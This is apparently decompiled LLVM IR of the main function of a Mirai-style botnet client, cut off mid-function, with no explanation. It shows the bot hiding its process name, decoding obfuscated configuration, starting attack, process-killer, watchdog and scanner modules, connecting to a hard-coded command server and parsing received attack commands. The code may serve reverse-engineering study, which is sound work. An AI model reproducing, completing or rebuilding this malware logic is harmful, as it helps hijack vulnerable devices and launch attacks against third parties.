  %stack_var_-392 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_d9b4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d9b4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d9cc = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  %v2_d9d8 = call i32 @__GI_sigaddset(i32 %v2_d9b4, i32 2)
  %v0_d9dc = load i32, i32* @r5, align 4
  store i32 %v0_d9dc, i32* %r2.global-to-local, align 4
  %v4_d9e8 = call i32 @__GI_sigprocmask(i32 %v0_d9dc, i32* nonnull %stack_var_-64, i32 %v0_d9dc)
  %v2_d9f4 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_da00 = call i32 @bsd_signal(i32 5, i32 54972)
  %v0_da04 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_24d58.93 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_24d5c.94, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_da04, i32* @global_var_24d4c.56, align 4
  store i16 5888, i16* bitcast (i32* @global_var_24d5a.95 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_24d58.93 to i16*), align 4
  %v6_da2c = call i32 @table_init(i32 %v0_da04, i32 ptrtoint (i32* @global_var_24d4c.56 to i32), i32 ptrtoint (i16** @global_var_24d58.93 to i32), i32 5888)
  store i32 ptrtoint (i32* @global_var_d834.82 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_220c0.84 to i32), i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_d834.82 to i32), i32* @global_var_220c0.84, align 4
  %v1_da3c = call i32 @ensure_single_instance(i32 %v6_da2c)
  %v1_da40 = call i32 @rand_init(i32 %v1_da3c)
  %v2_da48 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_da48, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_da50 = call i32 @util_zero()
  %v0_da54 = load i32, i32* @r6, align 4
  %v7_da54 = icmp eq i32 %v0_da54, 2
  br i1 %v7_da54, label %dec_label_pc_db8c, label %dec_label_pc_da5c

dec_label_pc_da5c:                                ; preds = %dec_label_pc_db8c, %entry, %dec_label_pc_db9c
  %v0_da5c = call i32 @rand_next()
  store i32 %v0_da5c, i32* @r6, align 4
  %v0_da64 = load i32, i32* @r8, align 4
  %v1_da64 = inttoptr i32 %v0_da64 to i32*
  %v2_da64 = load i32, i32* %v1_da64, align 4
  %v1_da68 = inttoptr i32 %v2_da64 to i8*
  %v2_da68 = call i32 @util_strlen(i8* %v1_da68)
  %v0_da70 = load i32, i32* @r8, align 4
  %v1_da70 = inttoptr i32 %v0_da70 to i32*
  %v2_da70 = load i32, i32* %v1_da70, align 4
  %v1_da74 = inttoptr i32 %v2_da70 to i8*
  %v2_da74 = call i32 @util_strlen(i8* %v1_da74)
  %v1_da78 = sub i32 20, %v2_da68
  %v0_da80 = load i32, i32* @r6, align 4
  %v3_da84 = urem i32 %v0_da80, %v1_da78
  %v2_da8c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_da8c, i32* @r5, align 4
  %v2_da90 = add i32 %v3_da84, %v2_da74
  store i32 %v2_da90, i32* @r4, align 4
  %v2_da9c = call i32 @rand_alpha_str(i32 %v2_da8c, i32 %v2_da90)
  %v2_daa4 = ptrtoint i32* %stack_var_-40 to i32
  %v1_daa8 = load i32, i32* @r4, align 4
  %v2_daa8 = add i32 %v1_daa8, %v2_daa4
  store i32 %v2_daa8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_dab4 = load i32, i32* @r8, align 4
  %v1_dab4 = inttoptr i32 %v0_dab4 to i32*
  %v2_dab4 = load i32, i32* %v1_dab4, align 4
  store i32 %v2_dab4, i32* @r0, align 4
  %v3_dab8 = add i32 %v2_daa8, -64
  %v4_dab8 = inttoptr i32 %v3_dab8 to i8*
  store i8 0, i8* %v4_dab8, align 1
  %v2_dabc = inttoptr i32 %v2_dab4 to i8*
  %v3_dabc = call i32 @util_strcpy(i8* %v2_dabc, i32 %v2_da8c)
  store i32 32, i32* @r1, align 4
  store i32 %v2_da8c, i32* @r0, align 4
  %v0_dac8 = call i32 @util_zero()
  %v0_dacc = call i32 @rand_next()
  store i32 %v0_dacc, i32* @r7, align 4
  %v0_dad4 = load i32, i32* @r8, align 4
  %v1_dad4 = inttoptr i32 %v0_dad4 to i32*
  %v2_dad4 = load i32, i32* %v1_dad4, align 4
  %v1_dad8 = inttoptr i32 %v2_dad4 to i8*
  %v2_dad8 = call i32 @util_strlen(i8* %v1_dad8)
  store i32 %v2_dad8, i32* @r6, align 4
  %v0_dae0 = load i32, i32* @r8, align 4
  %v1_dae0 = inttoptr i32 %v0_dae0 to i32*
  %v2_dae0 = load i32, i32* %v1_dae0, align 4
  %v1_dae4 = inttoptr i32 %v2_dae0 to i8*
  %v2_dae4 = call i32 @util_strlen(i8* %v1_dae4)
  %v0_dae8 = load i32, i32* @r6, align 4
  %v1_dae8 = sub i32 20, %v0_dae8
  %v0_daf0 = load i32, i32* @r7, align 4
  %v3_daf4 = urem i32 %v0_daf0, %v1_dae8
  %v2_daf8 = add i32 %v3_daf4, %v2_dae4
  store i32 %v2_daf8, i32* @r4, align 4
  %v2_db04 = call i32 @rand_alpha_str(i32 %v2_da8c, i32 %v2_daf8)
  store i32 %v2_daa4, i32* %r2.global-to-local, align 4
  %v1_db10 = load i32, i32* @r4, align 4
  %v2_db10 = add i32 %v1_db10, %v2_daa4
  store i32 %v2_db10, i32* %r3.global-to-local, align 4
  %v0_db14 = load i32, i32* @sb, align 4
  %v1_db14 = trunc i32 %v0_db14 to i8
  %v3_db14 = add i32 %v2_db10, -64
  %v4_db14 = inttoptr i32 %v3_db14 to i8*
  store i8 %v1_db14, i8* %v4_db14, align 1
  %v4_db20 = call i32 @prctl(i32 15, i32 %v2_da8c, i32 %v2_daa4, i32 %v2_db10)
  %v1_db28 = call i32 @table_unlock_val(i32 3)
  %v3_db34 = call i32 @table_retrieve_val(i32 3, i32* nonnull %stack_var_-48)
  %v3_db38 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_db38, i32* @r2, align 4
  %v2_db44 = call i32 @__GI___libc_write(i32 1, i32 %v3_db34)
  store i32 1, i32* @r2, align 4
  %v2_db54 = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_19714.107 to i32))
  %v1_db5c = call i32 @table_lock_val(i32 3)
  %v1_db60 = call i32 @attack_init(i32 %v1_db5c)
  %v1_db64 = call i32 @killer_init(i32 %v1_db60)
  %v1_db68 = call i32 @watchdog_maintain(i32 %v1_db64)
  %v0_db6c = call i32 @__libc_fork()
  %v1_db70 = load i32, i32* @sb, align 4
  %v7_db74 = icmp sgt i32 %v0_db6c, %v1_db70
  br i1 %v7_db74, label %dec_label_pc_db78, label %dec_label_pc_dbc8

dec_label_pc_db78:                                ; preds = %dec_label_pc_da5c
  ret i32 %v1_db70

dec_label_pc_db8c:                                ; preds = %entry
  %v0_db8c = load i32, i32* @r8, align 4
  %v1_db8c = add i32 %v0_db8c, 4
  %v2_db8c = inttoptr i32 %v1_db8c to i32*
  %v3_db8c = load i32, i32* %v2_db8c, align 4
  %v1_db90 = inttoptr i32 %v3_db8c to i8*
  %v2_db90 = call i32 @util_strlen(i8* %v1_db90)
  %v8_db98 = icmp sgt i32 %v2_db90, 31
  br i1 %v8_db98, label %dec_label_pc_da5c, label %dec_label_pc_db9c

dec_label_pc_db9c:                                ; preds = %dec_label_pc_db8c
  %v0_dba0 = load i32, i32* @r8, align 4
  %v1_dba0 = add i32 %v0_dba0, 4
  %v2_dba0 = inttoptr i32 %v1_dba0 to i32*
  %v3_dba0 = load i32, i32* %v2_dba0, align 4
  store i32 %v2_da48, i32* @r0, align 4
  %v2_dba8 = bitcast i32* %stack_var_-136 to i8*
  %v3_dba8 = call i32 @util_strcpy(i8* %v2_dba8, i32 %v3_dba0)
  %v0_dbac = load i32, i32* @r8, align 4
  %v1_dbac = add i32 %v0_dbac, 4
  %v2_dbac = inttoptr i32 %v1_dbac to i32*
  %v3_dbac = load i32, i32* %v2_dbac, align 4
  %v1_dbb4 = inttoptr i32 %v3_dbac to i8*
  %v2_dbb4 = call i32 @util_strlen(i8* %v1_dbb4)
  store i32 %v2_dbb4, i32* @r1, align 4
  store i32 %v3_dbac, i32* @r0, align 4
  %v0_dbc0 = call i32 @util_zero()
  br label %dec_label_pc_da5c

dec_label_pc_dbc8:                                ; preds = %dec_label_pc_da5c
  %v1_dbc8 = call i32 @__GI_setsid(i32 %v0_db6c)
  %v0_dbcc = load i32, i32* @sb, align 4
  %v1_dbd0 = call i32 @__GI___libc_close(i32 %v0_dbcc)
  %v1_dbd8 = call i32 @__GI___libc_close(i32 1)
  %v1_dbe0 = call i32 @__GI___libc_close(i32 2)
  %v1_dbe4 = call i32 @attack_init(i32 %v1_dbe0)
  %v1_dbe8 = call i32 @killer_init(i32 %v1_dbe4)
  %v1_dbec = call i32 @watchdog_maintain(i32 %v1_dbe8)
  %v1_dbf0 = call i32 @scanner_init(i32 %v1_dbec)
  store i32 ptrtoint (i32* @global_var_220b8.86 to i32), i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_220bc.110 to i32), i32* @sl, align 4
  %v2_dc04 = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_dc04, i32* @r6, align 4
  %v2_dc08 = ptrtoint i32* %stack_var_-392 to i32
  store i32 %v2_dc08, i32* @r7, align 4
  %v2_dce8 = ptrtoint i32* %stack_var_-72 to i32
  %v2_dd30 = ptrtoint i32* %stack_var_-144 to i32
  %v2_dff8 = ptrtoint i8** %stack_var_-42 to i32
  %v2_de90 = ptrtoint i32* %stack_var_-1416 to i32
  %v2_df88 = ptrtoint i32* %stack_var_-52 to i32
  %v2_df8c = ptrtoint i32* %stack_var_-56 to i32
  %v1_e048 = bitcast i32* %stack_var_-136 to i8*
  br label %dec_label_pc_dc0c

dec_label_pc_dc0c:                                ; preds = %dec_label_pc_e00c, %dec_label_pc_e040, %bb45, %dec_label_pc_dea8, %dec_label_pc_ddec, %dec_label_pc_dddc, %bb42, %dec_label_pc_e0c8, %dec_label_pc_e0ac, %dec_label_pc_e094, %dec_label_pc_e01c, %dec_label_pc_dfb4, %dec_label_pc_df00, %dec_label_pc_dd90, %dec_label_pc_dbc8
  store i32 0, i32* %stack_var_-264, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dc18

dec_label_pc_dc18:                                ; preds = %dec_label_pc_dc18, %dec_label_pc_dc0c
  %v1_dc1c = phi i32 [ %v1_dc20, %dec_label_pc_dc18 ], [ 4, %dec_label_pc_dc0c ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_dc1c = load i32, i32* @r6, align 4
  %v3_dc1c = add i32 %v2_dc1c, %v1_dc1c
  %v4_dc1c = inttoptr i32 %v3_dc1c to i32*
  store i32 0, i32* %v4_dc1c, align 4
  %v0_dc20 = load i32, i32* %r3.global-to-local, align 4
  %v1_dc20 = add i32 %v0_dc20, 4
  store i32 %v1_dc20, i32* %r3.global-to-local, align 4
  %v7_dc24 = icmp eq i32 %v1_dc20, 128
  br i1 %v7_dc24, label %dec_label_pc_dc2c, label %dec_label_pc_dc18

dec_label_pc_dc2c:                                ; preds = %dec_label_pc_dc18
  %v0_dc2c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_dc2c, i32* %stack_var_-392, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dc34

dec_label_pc_dc34:                                ; preds = %dec_label_pc_dc34, %dec_label_pc_dc2c
  %v1_dc38 = phi i32 [ %v1_dc3c, %dec_label_pc_dc34 ], [ 4, %dec_label_pc_dc2c ]
  store i32 0, i32* @r4, align 4
  %v2_dc38 = load i32, i32* @r7, align 4
  %v3_dc38 = add i32 %v2_dc38, %v1_dc38
  %v4_dc38 = inttoptr i32 %v3_dc38 to i32*
  store i32 0, i32* %v4_dc38, align 4
  %v0_dc3c = load i32, i32* %r3.global-to-local, align 4
  %v1_dc3c = add i32 %v0_dc3c, 4
  store i32 %v1_dc3c, i32* %r3.global-to-local, align 4
  %v7_dc40 = icmp eq i32 %v1_dc3c, 128
  br i1 %v7_dc40, label %dec_label_pc_dc48, label %dec_label_pc_dc34

dec_label_pc_dc48:                                ; preds = %dec_label_pc_dc34
  %v2_dc48 = load i32, i32* @global_var_220b8.86, align 4
  %v7_dc4c = icmp eq i32 %v2_dc48, -1
  br i1 %v7_dc4c, label %dec_label_pc_dc7c, label %dec_label_pc_dc54

dec_label_pc_dc54:                                ; preds = %dec_label_pc_dc48
  %v3_dc54 = udiv i32 %v2_dc48, 32
  %v3_dc5c = mul nuw nsw i32 %v3_dc54, 4
  store i32 %v2_daa4, i32* %ip.global-to-local, align 4
  %v2_dc64 = add i32 %v3_dc5c, %v2_daa4
  store i32 %v2_dc64, i32* %r3.global-to-local, align 4
  %v1_dc68 = add i32 %v2_dc64, -224
  %v2_dc68 = inttoptr i32 %v1_dc68 to i32*
  %v3_dc68 = load i32, i32* %v2_dc68, align 4
  %v1_dc6c = urem i32 %v2_dc48, 32
  %v7_dc74 = shl i32 1, %v1_dc6c
  %v8_dc74 = or i32 %v3_dc68, %v7_dc74
  store i32 %v8_dc74, i32* %r2.global-to-local, align 4
  store i32 %v8_dc74, i32* %v2_dc68, align 4
  br label %dec_label_pc_dc7c

dec_label_pc_dc7c:                                ; preds = %dec_label_pc_dc48, %dec_label_pc_dc54
  %v2_dc7c = load i32, i32* @global_var_220bc.110, align 4
  store i32 %v2_dc7c, i32* @r3, align 4
  %v7_dc80 = icmp eq i32 %v2_dc7c, -1
  store i32 ptrtoint (i32* @global_var_220bc.110 to i32), i32* @r8, align 4
  br i1 %v7_dc80, label %dec_label_pc_df0c, label %dec_label_pc_dc8c

dec_label_pc_dc8c:                                ; preds = %dec_label_pc_df0c, %dec_label_pc_dc7c, %bb44
  %v2_dc90 = load i8, i8* bitcast (i8** @global_var_2223c.111 to i8*), align 4
  %v3_dc90 = zext i8 %v2_dc90 to i32
  store i32 %v3_dc90, i32* %r3.global-to-local, align 4
  %v2_dc94 = icmp eq i8 %v2_dc90, 0
  %v2_ddac = load i32, i32* @global_var_220bc.110, align 4
  store i32 %v2_ddac, i32* %ip.global-to-local, align 4
  %v3_ddb4 = udiv i32 %v2_ddac, 32
  br i1 %v2_dc94, label %dec_label_pc_ddac, label %dec_label_pc_dc9c

dec_label_pc_dc9c:                                ; preds = %dec_label_pc_dc8c
  %v3_dcac = mul nuw nsw i32 %v3_ddb4, 4
  %v2_dcb0 = add i32 %v3_dcac, %v2_daa4
  store i32 %v2_dcb0, i32* %r3.global-to-local, align 4
  %v1_dcb4 = add i32 %v2_dcb0, -352
  %v2_dcb4 = inttoptr i32 %v1_dcb4 to i32*
  %v3_dcb4 = load i32, i32* %v2_dcb4, align 4
  %v1_dcb8 = urem i32 %v2_ddac, 32
  %v7_dcc0 = shl i32 1, %v1_dcb8
  %v8_dcc0 = or i32 %v3_dcb4, %v7_dcc0
  store i32 %v8_dcc0, i32* %r2.global-to-local, align 4
  store i32 %v8_dcc0, i32* %v2_dcb4, align 4
  br label %dec_label_pc_dcc8

dec_label_pc_dcc8:                                ; preds = %dec_label_pc_ddac, %dec_label_pc_dc9c
  %v2_dcc8 = load i32, i32* @global_var_220b8.86, align 4
  %v0_dccc = load i32, i32* %ip.global-to-local, align 4
  %v5_dcd0 = icmp slt i32 %v0_dccc, %v2_dcc8
  br i1 %v5_dcd0, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_dcc8
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_dcc8, %bb
  %v0_dcec = phi i32 [ %v2_dcc8, %dec_label_pc_dcc8 ], [ %v0_dccc, %bb ]
  store i32 0, i32* @lr, align 4
  store i32 10, i32* %stack_var_-72, align 4
  store i32 %v2_dce8, i32* %ip.global-to-local, align 4
  %v1_dcec = add i32 %v0_dcec, 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_dc08, i32* %r2.global-to-local, align 4
  %v5_dd04 = call i32 @__libc_select(i32 %v1_dcec, i32 %v2_dc04, i32 %v2_dc08, i32 0, i32 %v2_dce8)
  %v8_dd08 = icmp eq i32 %v5_dd04, -1
  br i1 %v8_dd08, label %dec_label_pc_dc0c, label %dec_label_pc_dd10

dec_label_pc_dd10:                                ; preds = %bb42
  %v6_dd04 = trunc i32 %v5_dd04 to i16
  %v3_dd10 = icmp eq i16 %v6_dd04, 0
  br i1 %v3_dd10, label %dec_label_pc_dd18, label %dec_label_pc_dd44

dec_label_pc_dd18:                                ; preds = %dec_label_pc_dd10
  %v2_dd1c = load i32, i32* @sb, align 4
  %v5_dd20 = srem i32 %v2_dd1c, 6
  %v4_dd28 = sub i32 %v2_dd1c, %v5_dd20
  store i32 %v4_dd28, i32* %r3.global-to-local, align 4
  store i32 %v5_dd20, i32* %r2.global-to-local, align 4
  %v2_dd34 = icmp eq i32 %v5_dd20, 0
  %v7_dd38 = inttoptr i32 %v5_dd04 to i8*
  store i8* %v7_dd38, i8** %stack_var_-42, align 4
  %v1_dd3c = add i32 %v2_dd1c, 1
  store i32 %v1_dd3c, i32* @sb, align 4
  br i1 %v2_dd34, label %dec_label_pc_dff0, label %dec_label_pc_dd44

dec_label_pc_dd44:                                ; preds = %dec_label_pc_dd10, %dec_label_pc_dd18, %dec_label_pc_dff0
  store i32 ptrtoint (i8** @global_var_2223c.111 to i32), i32* %r2.global-to-local, align 4
  %v2_dd48 = load i8, i8* bitcast (i8** @global_var_2223c.111 to i8*), align 4
  %v3_dd48 = zext i8 %v2_dd48 to i32
  store i32 %v3_dd48, i32* @r4, align 4
  %v2_dd4c = icmp eq i8 %v2_dd48, 0
  %v2_dddc = load i32, i32* @global_var_220bc.110, align 4
  br i1 %v2_dd4c, label %dec_label_pc_dddc, label %dec_label_pc_dd54

dec_label_pc_dd54:                                ; preds = %dec_label_pc_dd44
  %v3_dd5c = udiv i32 %v2_dddc, 32
  store i32 %v2_daa4, i32* %ip.global-to-local, align 4
  %v3_dd64 = mul nuw nsw i32 %v3_dd5c, 4
  %v2_dd68 = add i32 %v3_dd64, %v2_daa4
  store i32 %v2_dd68, i32* %r3.global-to-local, align 4
  %v1_dd6c = add i32 %v2_dd68, -352
  %v2_dd6c = inttoptr i32 %v1_dd6c to i32*
  %v3_dd6c = load i32, i32* %v2_dd6c, align 4
  %v1_dd70 = urem i32 %v2_dddc, 32
  %v6_dd74 = ashr i32 %v3_dd6c, %v1_dd70
  store i32 %v6_dd74, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_2223c.111 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_dd80 = urem i32 %v6_dd74, 2
  %v2_dd80 = icmp eq i32 %v1_dd80, 0
  store i8 0, i8* bitcast (i8** @global_var_2223c.111 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_220bc.110 to i32), i32* @r4, align 4
  br i1 %v2_dd80, label %dec_label_pc_dd90, label %dec_label_pc_df7c

dec_label_pc_dd90:                                ; preds = %dec_label_pc_dd54
  store i32 56728, i32* @lr, align 4
  %v1_dd94 = icmp ne i32 %v2_dddc, -1
  call void @__pseudo_cond_branch(i1 %v1_dd94, i32 ptrtoint (i32* @global_var_146d0.113 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_dd9c = load i32, i32* @r4, align 4
  %v2_dd9c = inttoptr i32 %v1_dd9c to i32*
  store i32 -1, i32* %v2_dd9c, align 4
  %v1_dda4 = call i32 @sleep(i32 1)
  br label %dec_label_pc_dc0c

dec_label_pc_ddac:                                ; preds = %dec_label_pc_dc8c
  store i32 %v2_daa4, i32* %r2.global-to-local, align 4
  %v3_ddbc = mul nuw nsw i32 %v3_ddb4, 4
  %v2_ddc0 = add i32 %v3_ddbc, %v2_daa4
  store i32 %v2_ddc0, i32* %r3.global-to-local, align 4
  %v1_ddc4 = add i32 %v2_ddc0, -224
  %v2_ddc4 = inttoptr i32 %v1_ddc4 to i32*
  %v3_ddc4 = load i32, i32* %v2_ddc4, align 4
  %v1_ddc8 = urem i32 %v2_ddac, 32
  %v7_ddd0 = shl i32 1, %v1_ddc8
  %v8_ddd0 = or i32 %v3_ddc4, %v7_ddd0
  store i32 %v8_ddd0, i32* %r2.global-to-local, align 4
  store i32 %v8_ddd0, i32* %v2_ddc4, align 4
  br label %dec_label_pc_dcc8

dec_label_pc_dddc:                                ; preds = %dec_label_pc_dd44
  %v7_dde0 = icmp eq i32 %v2_dddc, -1
  store i32 ptrtoint (i32* @global_var_220bc.110 to i32), i32* @r8, align 4
  br i1 %v7_dde0, label %dec_label_pc_dc0c, label %dec_label_pc_ddec

dec_label_pc_ddec:                                ; preds = %dec_label_pc_dddc
  %v3_ddec = udiv i32 %v2_dddc, 32
  %v3_ddf4 = mul nuw nsw i32 %v3_ddec, 4
  store i32 %v2_daa4, i32* %ip.global-to-local, align 4
  %v2_ddfc = add i32 %v3_ddf4, %v2_daa4
  store i32 %v2_ddfc, i32* %r3.global-to-local, align 4
  %v1_de00 = add i32 %v2_ddfc, -224
  %v2_de00 = inttoptr i32 %v1_de00 to i32*
  %v3_de00 = load i32, i32* %v2_de00, align 4
  %v1_de04 = urem i32 %v2_dddc, 32
  %v6_de08 = ashr i32 %v3_de00, %v1_de04
  store i32 %v6_de08, i32* %r2.global-to-local, align 4
  %v1_de0c = urem i32 %v6_de08, 2
  %v2_de0c = icmp eq i32 %v1_de0c, 0
  br i1 %v2_de0c, label %dec_label_pc_dc0c, label %dec_label_pc_de14

dec_label_pc_de14:                                ; preds = %dec_label_pc_ddec
  store i32 %v2_dd30, i32* @lr, align 4
  %v6_de18 = inttoptr i32 %v3_dd48 to i8*
  store i8* %v6_de18, i8** %stack_var_-42, align 4
  %v0_de1c = call i32 @__GI___errno_location()
  %v0_de20 = load i32, i32* @r4, align 4
  %v2_de20 = inttoptr i32 %v0_de1c to i32*
  store i32 %v0_de20, i32* %v2_de20, align 4
  store i32 %v0_de1c, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_de34 = load i32, i32* @global_var_220bc.110, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_de40 = call i32 @__libc_recv(i32 %v2_de34, i32 %v2_dff8, i32 2, i32 16386)
  %v7_de44 = icmp eq i32 %v4_de40, -1
  br i1 %v7_de44, label %dec_label_pc_e00c, label %dec_label_pc_de4c

dec_label_pc_de4c:                                ; preds = %dec_label_pc_de14
  %v2_de4c = icmp eq i32 %v4_de40, 0
  br i1 %v2_de4c, label %dec_label_pc_e01c, label %dec_label_pc_de54

dec_label_pc_de54:                                ; preds = %dec_label_pc_de4c
  store i32 %v2_dd30, i32* @r1, align 4
  %v3_de58 = load i8*, i8** %stack_var_-42, align 4
  %v4_de58 = ptrtoint i8* %v3_de58 to i32
  store i32 %v4_de58, i32* %r3.global-to-local, align 4
  %v2_de5c = icmp eq i8* %v3_de58, null
  br i1 %v2_de5c, label %dec_label_pc_e0ac, label %dec_label_pc_de64

dec_label_pc_de64:                                ; preds = %dec_label_pc_de54
  %v3_de64 = udiv i32 %v4_de58, 256
  %v1_de68 = mul i32 %v4_de58, 256
  %v4_de6c = and i32 %v1_de68, 65280
  %v5_de6c = or i32 %v4_de6c, %v3_de64
  %v6_de6c = trunc i32 %v5_de6c to i16
  store i32 %v5_de6c, i32* %r2.global-to-local, align 4
  store i32 %v2_dd30, i32* %r3.global-to-local, align 4
  %v7_de78 = inttoptr i32 %v5_de6c to i8*
  store i8* %v7_de78, i8** %stack_var_-42, align 4
  %tmp46 = icmp ugt i16 %v6_de6c, 1024
  br i1 %tmp46, label %dec_label_pc_e0c8, label %dec_label_pc_de80

dec_label_pc_de80:                                ; preds = %dec_label_pc_de64
  %v0_de80 = load i32, i32* @r4, align 4
  %v1_de80 = load i32, i32* @r5, align 4
  %v2_de80 = inttoptr i32 %v1_de80 to i32*
  store i32 %v0_de80, i32* %v2_de80, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_de8c = load i32, i32* @global_var_220bc.110, align 4
  %v7_de94 = call i32 @__libc_recv(i32 %v2_de8c, i32 %v2_de90, i32 %v5_de6c, i32 16386)
  %v7_de98 = icmp eq i32 %v7_de94, -1
  br i1 %v7_de98, label %dec_label_pc_e00c, label %dec_label_pc_dea0

dec_label_pc_dea0:                                ; preds = %dec_label_pc_de80
  %v2_dea0 = icmp eq i32 %v7_de94, 0
  br i1 %v2_dea0, label %dec_label_pc_e01c, label %dec_label_pc_dea8

dec_label_pc_dea8:                                ; preds = %dec_label_pc_dea0
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_deb8 = load i32, i32* @global_var_220bc.110, align 4
  %v4_debc = call i32 @__libc_recv(i32 %v2_deb8, i32 %v2_dff8, i32 2, i32 16384)
  %v3_dec4 = load i8*, i8** %stack_var_-42, align 4
  %v4_dec4 = ptrtoint i8* %v3_dec4 to i32
  %v3_dec8 = udiv i32 %v4_dec4, 256
  %v1_decc = mul i32 %v4_dec4, 256
  %v4_ded0 = and i32 %v1_decc, 65280
  %v5_ded0 = or i32 %v4_ded0, %v3_dec8
  store i32 %v5_ded0, i32* %ip.global-to-local, align 4
  store i32 %v2_dd30, i32* @lr, align 4
  store i32 %v5_ded0, i32* %r2.global-to-local, align 4
  %v2_dee0 = load i32, i32* @global_var_220bc.110, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_dee8 = inttoptr i32 %v5_ded0 to i8*
  store i8* %v6_dee8, i8** %stack_var_-42, align 4
  %v6_deec = call i32 @__libc_recv(i32 %v2_dee0, i32 %v2_de90, i32 %v5_ded0, i32 16384)
  store i32 %v2_dd30, i32* %r2.global-to-local, align 4
  %v3_def4 = load i8*, i8** %stack_var_-42, align 4
  %v3_def8 = icmp eq i8* %v3_def4, null
  br i1 %v3_def8, label %dec_label_pc_dc0c, label %dec_label_pc_df00

dec_label_pc_df00:                                ; preds = %dec_label_pc_dea8
  %v4_def4 = ptrtoint i8* %v3_def4 to i32
  %v5_df04 = call i32 @attack_parse(i32* nonnull %stack_var_-1416, i32 %v4_def4, i32 %v2_dd30)
  br label %dec_label_pc_dc0c

dec_label_pc_df0c:                                ; preds = %dec_label_pc_dc7c
  %v0_df14 = load i32, i32* @r4, align 4
  store i32 %v0_df14, i32* %r2.global-to-local, align 4
  %v3_df18 = call i32 @socket(i32 2, i32 1, i32 %v0_df14)
  %v7_df1c = icmp eq i32 %v3_df18, -1
  store i32 %v3_df18, i32* @r5, align 4
  %v1_df24 = load i32, i32* @r8, align 4
  %v2_df24 = inttoptr i32 %v1_df24 to i32*
  store i32 %v3_df18, i32* %v2_df24, align 4
  br i1 %v7_df1c, label %dec_label_pc_dc8c, label %dec_label_pc_df2c

dec_label_pc_df2c:                                ; preds = %dec_label_pc_df0c
  %v0_df2c = load i32, i32* @r4, align 4
  store i32 %v0_df2c, i32* @r2, align 4
  %v2_df34 = call i32 @__libc_fcntl(i32 %v3_df18, i32 3)
  %v1_df3c = or i32 %v2_df34, 2048
  store i32 %v1_df3c, i32* @r2, align 4
  %v0_df40 = load i32, i32* @r5, align 4
  %v2_df44 = call i32 @__libc_fcntl(i32 %v0_df40, i32 4)
  %v2_df4c = load i32, i32* @global_var_220c0.84, align 4
  store i32 %v2_df4c, i32* %r3.global-to-local, align 4
  %v2_df50 = icmp eq i32 %v2_df4c, 0
  br i1 %v2_df50, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_df2c
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_df2c, %bb43
  %v2_df58 = xor i1 %v2_df50, true
  call void @__pseudo_cond_branch(i1 %v2_df58, i32 ptrtoint (i32* @global_var_10b48.114 to i32))
  store i32 ptrtoint (i8** @global_var_2223c.111 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_df64 = load i32, i32* @global_var_220bc.110, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_2223c.111 to i8*), align 4
  %v4_df74 = call i32 @__libc_connect(i32 %v2_df64, i32 ptrtoint (i16** @global_var_24d58.93 to i32), i32 16)
  br label %dec_label_pc_dc8c

dec_label_pc_df7c:                                ; preds = %dec_label_pc_dd54
  store i32 4, i32* @r5, align 4
  store i32 %v2_df88, i32* %r3.global-to-local, align 4
  store i32 %v2_df8c, i32* @lr, align 4
  store i32 1, i32* @r1, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_dfa4 = call i32 @getsockopt(i32 %v2_dddc, i32 1, i32 4, i32 %v2_df88, i32 %v2_df8c)
  %v3_dfa8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_dfa8, i32* %r3.global-to-local, align 4
  %v2_dfac = icmp eq i32 %v3_dfa8, 0
  br i1 %v2_dfac, label %dec_label_pc_e040, label %dec_label_pc_dfb4

dec_label_pc_dfb4:                                ; preds = %dec_label_pc_df7c
